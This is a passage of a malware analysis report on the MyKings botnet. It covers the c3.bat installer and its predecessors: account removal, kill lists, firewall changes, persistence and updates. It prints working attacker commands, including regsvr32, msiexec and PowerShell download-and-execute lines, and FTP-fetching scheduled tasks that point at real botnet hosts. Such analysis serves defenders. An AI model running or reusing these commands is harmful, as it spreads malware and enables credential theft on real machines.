@@ -1,0 +1,421 @@
+c3.bat – component installation and clean-up
+c3.bat is the component that nails down the infection process. It is a relatively large batch file; The
+size varies, but it normally falls somewhere between 3,000 and 20,000 bytes in size.
+It spawns a few dozen processes as it completes its task which is downloading updates, installing
+components, establishing persistence and cleaning up all traces that were created during the
+initial infection process. These will be detailed in the following sections.
+It is the most commonly used component of the campaigns, several dozen variants of it were
+found which were different in minor details, like the kill list or user account names.
+It is usually dropped by self-extracting RAR archives, containing two files, n.vbs and c3.bat .
+11
+The Chinese comment text means “ The following comment contains the self-extracting script
+command ” – once again, a meaningless, default text.
+The VBS file is set to automatically execute on opening the archive and runs the main installer
+batch file:
+```
+  Set ws = CreateObject("Wscript.Shell")
+on error resume next
+ws.run "c:\windows\web\c3.bat",vbhide
+  wscript.quit
+```
+System cleanup
+The batch file starts with removing a handful of user accounts. There are slight changes in
+different variants, but the first two are always there:
+Interestingly, most of those are not created by the MyKings botnet (although the EternalBlue
+spreader adds the $admin user account). On the other hand, the creation of the mm123$ account was
+reported here in relation with the NSABuffMiner Trojan.
+It's not the first time anyone has seen a SQL brute force attack using this username with the
+following event sequence:
+```
+  A user logged in using MSSQL with the following username: sa
+A user logged in using MSSQL with the following credentials: sa / **
+A user logged in using MSSQL with the following credentials: kisadmin
+A user logged in using MSSQL with the following username: sa
+A user logged in using MSSQL with the following credentials: kisadmin
+MSSQL procedures were created: sp_addextendedproc and sp_dropextendedproc
+c:\program files\microsoft sql
+  server\mssql11.sqlexpress\mssql\binn\sqlservr.exe set the command line
+  taskkill.exe to run using Persistency - Image Hijack 50 times
+```
+12
+We found no relation between MyKings and the server www.mask329[.]com and the file
+fuckgothin.inf, but this event sequence seems to be related to the installation of a miner, since
+they happened at about the same time. The latter file name used in the installation script that was
+connected to the Bulehero miner botnet.
+So, it is more likely that MyKings removes accounts created by competing botnets from the
+infected computer.
+After removing the user accounts the batch file stops the AnyDesk service and disables it. We have
+found no evidence that MyKings would target AnyDesk in any way, but in general it would attempt
+to brute force RDP passwords.
+The batch file also restarts the SQL server application and deletes the file
+c:\windows\system\my1.bat which is a batch file used during the update mechanisms.
+The batch file also kills a large list of processes, then removes programs for the computer. This is
+not unusual for a malicious program, but it is usually security software that gets removed. Not in
+the case of c3.bat : the targets look like other miner botnets or earlier versions of itself. Crypto
+mining is a very resource intensive process, there is place for only one on a computer. MyKings
+tries to make sure it doesn't have to share the precious CPU with other miners – even if friendlies.
+Many of the process names are used by older versions of the MyKings botnet, so this mechanism
+can also serve as part of an updating process. Note that older miner versions likely used older (and
+already blocked) wallet IDs, which are useless. The list of killed processes changed over the time,
+but typically looks like this:
+```
+NsCpuCNMiner32.exe
+tlscntr.exe
+eter.exe
+lsmo.exe
+lsarr.exe
+convert.exe
+WinSCV.exe
+ctfmonc.exe
+lsmose.exe
+svhost.exe
+secscan.exe
+wuauser.exe
+```
+```
+help.exe
+doc001.exe
+dhelllllper.exe
+DOC001.exe
+dhelper.exe
+conime.exe
+a.exe
+docv8.exe
+king.exe
+name.exe
+doc.exe
+wodCmdTerm.exe
+```
+```
+win1ogins.exe
+win1ogins.exe
+lsaus.exe
+lsars.exe
+lsacs.exe
+regedit.exe
+lsmsm.exe
+v5.exe
+anydesk.exe
+sqler.exe
+sqlservr.exe
+NsCpuCNMiner64.exe
+```
+13
+```
+splwow64.exe
+boy.exe
+powered.EXE
+systems.exe
+acnom.exe
+regdrv.exe
+mscsuscr.exe
+Pviunc.exe
+Bllianc.exe
+st.exe
+nvidia_update.exe
+dether.exe
+buff2.exe
+a.exe
+lacas.exe
+```
+14
+Document Title
+Some of the names are more frequently used, other could be associated with particular threats, such as:
+```
+  doc001.exe (XMRig miner)
+  docv8.exe (XMRig Miner)
+  wodCmdTerm.exe (XMRig Miner)
+  NsCpuCNMiner64.exe (CNMiner)
+  tlscntr.exe (XMRig Miner)
+  ctfmonc.exe (XMRig Miner)
+  wuauser.exe (XMRig Miner)
+  mscsuscr.exe (XMRig Miner)
+  Pviunc.exe (XMRig Miner)
+  Bllianc.exe (XMRig Miner)
+  dether.exe (XMRig Miner)
+```
+After stopping the processes, the batch file deletes the executables belonging to them.
+Following that the script wipes out executables from a large list of directories. In some cases, it just
+removes hidden/system attributes and then deletes all files.
+In other cases, it first issues the cacls /e /d everyone command to block access to the specific directory.
+Then may or may not perform the delete (for some directories it does delete, for others, wouldn't).
+Finally releases the directory by granting full access to it.
+For a third group the script issues a cacls /e /d system command to block access to the specific directory,
+then does nothing about it.
+This could also be a mechanism to disable execution of already installed malicious programs, including
+crypto miners.
+Next the batch file deletes scheduled tasks that could belong to earlier variants of the MyKings or other
+botnets.
+The list of tasks slightly varies between the variants, a typical list is the following:
+```
+  WindowsUpdate1
+  WindowsUpdate3
+  Windows_Update
+  Update
+  Update2
+  Update4
+  Update3
+  windowsinit
+System Security Check
+  AdobeFlashPlayer
+  updat_windows
+  at1
+at2
+Microsoft LocalManager[Windows Server 2008 R2 Enterprise]
+  \Microsoft\Windows\UPnP\Services
+  Microsoft LocalManager[Windows Server 2008 R2 Standard]
+```
+The batch file also deletes registry autorun keys, for example:
+```
+  reg delete HKlm\Software\Microsoft\Windows\CurrentVersion\Run /v "start1" /f
+  reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
+  "SHELL" /f
+```
+And as the last step, the batch file deletes itself (and potentially earlier versions of itself) from the
+system).
+```
+  del C:\windows\system32\drivers\c3.bat
+```
+```
+  del c:\windows\web\c3.bat
+```
+Firewall rules
+The batch file modifies the firewall rules. The purpose is to close the ports that were used for the initial
+infection or could be used for subsequent infections. This way the botnet protects itself from hostile
+takeover by securing the infected computer.
+It creates new firewall rules that block access to the infected computer on ports 135, 137, 138, 139 and
+445 (belonging to services like RPC, NetBIOS, and Active Directory). This closes the possibility of
+reinfection using RDP or EternalBlue exploit.
+On Windows XP systems additionally closes port 445 by setting the appropriate registry key
+SMBDeviceEnabled :
+```
+  ver | find "5.1." > NUL && sc config SharedAccess start= auto && echo Yes | reg
+  add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetBT\Parameters /t
+  REG_DWORD /v SMBDeviceEnabled /d 0
+```
+The purpose of this tedious system clean-up is to remove traces of the initial infection, older
+components of the botnet, remove the competition and close the possibilities of reinfection by other
+malware. In a way, the system ends up cleaner after the infection than before – apart for the presence
+of the MyKings components.
+Components update
+The script downloads a series of different scripts from the update sites, for example:
+The role of the downloaded files is the following:
+
+s.ps1 : terminates all svchost.exe and conhost.exe processes that are not running form the
+
+system directory, and executes c:\windows\temp\conhost.exe
+
+
+s.txt : information gathering script
+
+
+s.jpg : kills miner related processes and defines firewall rules
+
+
+1.txt : downloads PE components (typically bootkit installer and c3.bat dropper)
+
+
+2.txt : URL list for the components
+
+
+Multiple different components are downloaded, and several persistence methods are used to make sure
+the bootkit survives a reboot on the computer, these are detailed in a separate section.
+Persistence
+The batch script utilizes a handful of different methods to achieve persistence and survive a system
+restart.
+16
+Bootkit
+The bootkit component is the first of the persistence methods. Because the IPL is overwritten with the
+malicious code, it will execute on every reboot, and downloads and executes the botnet components.
+This process is explained in more detail in the section describing 01.dat .
+Registry autorun keys
+In addition to that the batch file creates a registry autorun key, that uses the regsvr32.exe to fetch and
+execute the update, in this case v.sct which is a simple scriptlet that downloads the Win32 components.
+```
+  reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "start" /d
+  "regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll" /f
+  reg add "HKLM\Software\wow6432node\Microsoft\Windows\CurrentVersion\Run" /v
+  "start" /d "regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll" /f
+```
+Scheduled tasks
+Some of the components are registered with a separate task. The names of the tasks are typically ok,
+Mysa, Mysa1, Mysa2 and Mysa3 .
+The scheduled tasks are executed on system startup with a command line that connects to an ftp server
+and downloads the update, in case of the Mysa task the executable will be saved as a.exe
+The scheduled tasks typically download further components using ftp connection, in this particular case
+the Forshare backdoor and a miner.
+Then another set of tasks start the downloaded ok.dat, which is a Windows DLL file, so the script
+executes the ServiceMain export with the parameter aaaa . This component is the PCShare backdoor.
+WMI listeners
+The third method uses WMI filters to establish execution.
+c3.bat first deletes the following WMI event listeners that were created by earlier version of the botnet:
+ - `fuckyoumm2_filter`
+
+ - `fuckyoumm2_consumer`
+
+ - `fuckayoumm3`
+
+ - `fuckayoumm4`
+
+ - `Windows Events Consumer`
+
+ - `Windows Events Consumer4`
+
+17
+ - `Windows Events Filter`
+
+Then registers the new filter with the name fuckyoumm4 which executes every 3 hours (10800 seconds)
+This is the event code is an encrypted PowerShell command that downloads a text file from the URL
+hxxp://wmi.1217bye[.]host/2.txt (the URL may change over time).
+```
+  $wc=New-Object
+  System.Net.WebClient;$wc.DownloadString('hxxp://wmi.1217bye[.]host/2.txt').trim(
+  ) -split '[\r\n]+'|%{$n=$.split('/')[-1];$wc.DownloadFile($, $n);start $n;}
+```
+The content of this file is supposed to contain a list of next stage URLs, which get downloaded and
+executed. An example content of the 2.txt file was the following:
+```
+  hxxp://173.247.239[.]186/ok.exe
+  hxxp://173.247.239[.]186/upsupx.exe
+  hxxp://173.247.239[.]186/u.exe
+```
+Additional three commands in the WMI script download three further components:
+```
+  hxxp://173.208.139[.]170/s.txt
+  hxxp://35.182.171[.]137/s.jpg
+  hxxp://wmi.1217bye[.]host/S.ps1
+```
+Here s.txt is a PowerShell script that downloads a kill list file from hxxp://139.5.177[.]19/l.txt. This file
+contains a list of process names; the script stops every process in that list:
+```
+  lsmose.exe,C:\Windows\debug\lsmose.exe,1
+  lsmos.exe,C:\Windows\debug\lsmos.exe,1
+  lsmo.exe,C:\Windows\debug\lsmo.exe,1
+  csrw.exe,C:\Program Files (x86)\Common Files\csrw.exe,1
+```
+18
+```
+  csrw.exe,C:\Program Files\Common Files\csrw.exe,1
+  lsmosee.exe,c:\windows\help\lsmosee.exe,1
+  csrs.exe,c:\csrs.exe,1
+```
+Each entry has the process name, the file path and a flag that indicates whether the process itself has to
+be stopped.
+This third persistence method is not present in all c3.bat instances.
+System fingerprinting
+As a final act c3.bat downloads and executes s.txt . This fetches a kill list, and stops the processes
+specified in it, and additionally downloads and executes a script called up.txt .
+This is an information gathering script that collects system information (including passwords using
+Powerkatz) and uploads it to the ftp server 192.187.111.66, which was the active collection server at the
+time of writing this document. Several other ftp sites were used during the lifetime of this botnet.
+The latest drop site delivers an additional (and rather vulgar abusive) message for the curious eyes:
+The time stamps on the server suggest time zone GMT+7, which covers parts of eastern Russia,
+Vietnam, and Indonesia
+Predecessor: c2.bat
+The name c3.bat hints that there might be earlier version. In fact, there is a Russian blog that connects
+the Adylkuzz botnet with the DoublePulsar exploit. Additionally, the blog mentions a related file, c2.bat,
+that (although a lot smaller than a typical c3.bat – as expected form a predecessor) does very similar
+things, including creating the Mysa1 and Mysa2 scheduled tasks (with similar content as c3.bat ).
+```
+  ping 127.0.0.1 -n 10
+  net1 user IISUSER$ /del&net1 user IUSR_Servs /del
+  cacls c:\windows\twain_32\csrss.exe /e /d system&cacls
+  c:\windows\twain_32\csrss.exe /e /d everyone&del c:\windows\twain_32*.*
+  schtasks /create /tn "Mysa1" /tr "rundll32.exe
+  c:\windows\debug\item.dat,ServiceMain aaaa" /ru "system" /sc onstart /F
+  schtasks /create /tn "Mysa2" /tr "cmd /c echo open ftp.oo000oo.me>p&echo
+  test>>p&echo 1433>>p&echo get s.dat c:\windows\debug\item.dat>>p&echo bye>>p&ftp
+  -s:p" /ru "system" /sc onstart /F
+  netsh ipsec static add policy name=win
+…
+```
+Additionally, the very characteristic WMI event code was also presented in the blog.
+This earlier batch file version used a slightly different configuration file which contained two sections.
+```
+  [down]
+  hxxp://79.124.78[.]127/close.bat C:\windows\debug\c2.bat 1
+  hxxp://139.5.177[.]10/ok.exe c:\windows\temp\v.exe 1
+  hxxp://185.22.172[.]13/upsupx.exe c:\windows\temp\conhost.exe 1
+  [cmd]
+net1 start schedule
+  net1 user IISUSER_ACCOUNTXX /del&net1 user IUSR_ADMIN /del&net1 user snt0454
+  /del&taskkill /f /im Logo1_.exe&del c:\windows\Logo1_.exe&taskkill /f /im
+```
+19
+```
+  Update64.exe&del c:\windows\dell\Update64.exe
+  taskkill /f /im misiai.exe&del misiai.exe&del c:\windows\RichDllt.dll&net1 user
+  asp.net /del&taskkill /f /im winhost.exe&del c:\windows\winhost.exe&del
+  c:\windows\updat.exe
+  taskkill /f /im netcore.exe&del c:\windows\netcore.exe&taskkill /f /im
+  ygwmgo.exe&del c:\windows\ygwmgo.exe&net1 user aspnet /del&net1 user LOCAL_USER
+  /del
+  schtasks /create /tn "Mysa" /tr "cmd /c echo open ftp.1226bye.xyz>s&echo
+  test>>s&echo 1433>>s&echo binary>>s&echo get a.exe c:\windows\update.exe>>s&echo
+  bye>>s&ftp -s:s&c:\windows\update.exe" /ru "system" /sc onstart /F
+  schtasks /create /tn "Mysa1" /tr "rundll32.exe
+  c:\windows\debug\item.dat,ServiceMain aaaa" /ru "system" /sc onstart /F
+  schtasks /create /tn "Mysa2" /tr "cmd /c echo open ftp.1226bye.xyz>p&echo
+  test>>p&echo 1433>>p&echo get s.dat c:\windows\debug\item.dat>>p&echo bye>>p&ftp
+  -s:p" /ru "system" /sc onstart /F
+  schtasks /create /tn "Mysa3" /tr "cmd /c echo open ftp.1226bye.xyz>ps&echo
+  test>>ps&echo 1433>>ps&echo get s.rar c:\windows\help\lsmosee.exe>>ps&echo
+  bye>>ps&ftp -s:ps&c:\windows\help\lsmosee.exe" /ru "system" /sc onstart /F
+  schtasks /create /tn "ok" /tr "rundll32.exe c:\windows\debug\ok.dat,ServiceMain
+  aaaa" /ru "system" /sc onstart /F
+  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v
+  "start" /d "regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll" /f
+  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v
+  "start1" /d "msiexec.exe /i hxxp://js.1226bye[.]xyz:280/helloworld.msi /q" /f
+  echo 123>>1.txt&start C:\windows\debug\c2.bat&start rundll32.exe
+  c:\windows\debug\item.dat,ServiceMain aaaa
+```
+The [down] section has the same structure as the download file list in the newer variants, specifies the
+download URLs and the local path to save.
+The [command] is similar but a lot smaller than the corresponding section in c3.bat . But it uses the same
+scheduled task names and ftp update sites. Clearly, c2.bat was the previous version of the main script.
+Pre-predecessor: c.bat
+It is only logical to ask that if both c2.bat and c3.bat exist, what about c1.bat ? At this point we can
+reasonably suspect that the existence of an even earlier version of this script is a possibility.
+This assumption is further supported by the fact that one of the c2.bat instances contains the following
+clean-up code, that removes a certain c.bat :
+```
+  del c:\windows\debug\c.bat
+  del c:\windows\debug\c2.bat
+```
+This hints that the original version of the script must have existed with this name. We found a posting
+on a malware analysis message board from June 2017 where a user describes a MyKings attack (file
+names and distribution servers match to the identified campaigns) that was creating a file with that
+name, which was later followed up with a more detailed description.
+The attack used server associated with MyKings, also the config file uses the same [down] and
+[command] section as c2.bat .
+This very early c.bat lacked most of the functionality of the later versions, only the firewall rule setting
+code was there.
+```
+  ping 127.0.0.1 -n 10
+  reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v
+  "rundll32" /f
+sc config MpsSvc start= auto&net1 start MpsSvc&netsh advfirewall set allprofiles
+```
+20
+```
+  state on
+netsh advfirewall firewall delete rule name="deny tcp 445"
+  netsh advfirewall firewall delete rule name="tcp all"
+  netsh advfirewall firewall delete rule name="deny udp 445"
+  netsh advfirewall firewall delete rule name="tcpall"
+  netsh advfirewall firewall add rule name="tcp all" dir=in protocol=tcp
+  localport=0-65535 action=allow
+  netsh advfirewall firewall add rule name="deny tcp 445" dir=in protocol=tcp
+  localport=445 action=block
+  netsh advfirewall firewall add rule name="deny udp 445" dir=in protocol=udp
+  localport=445 action=block
+  netsh advfirewall firewall add rule name="tcpall" dir=out protocol=tcp
+  localport=0-65535 action=allow
+  del c:\windows\debug\c.bat
+  exit
+```
+There was a WMIInjector Trojan mentioned in the article that executes the so-characteristic WMI
+command.
+Apparently, the functionality of this Win32 component was later migrated to the scripts used in the
+attacks nowadays.
